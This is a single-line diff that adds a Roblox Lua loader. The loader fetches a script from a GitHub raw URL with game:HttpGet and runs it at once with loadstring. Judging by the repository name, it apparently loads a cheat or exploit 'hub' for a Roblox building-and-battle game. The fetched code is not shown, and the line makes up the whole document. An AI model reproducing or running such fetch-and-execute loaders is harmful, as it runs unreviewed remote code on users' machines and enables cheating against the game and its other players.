@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/errorline21/Dimension53-Hub-Build-and-Battle-/main/main.lua"))()
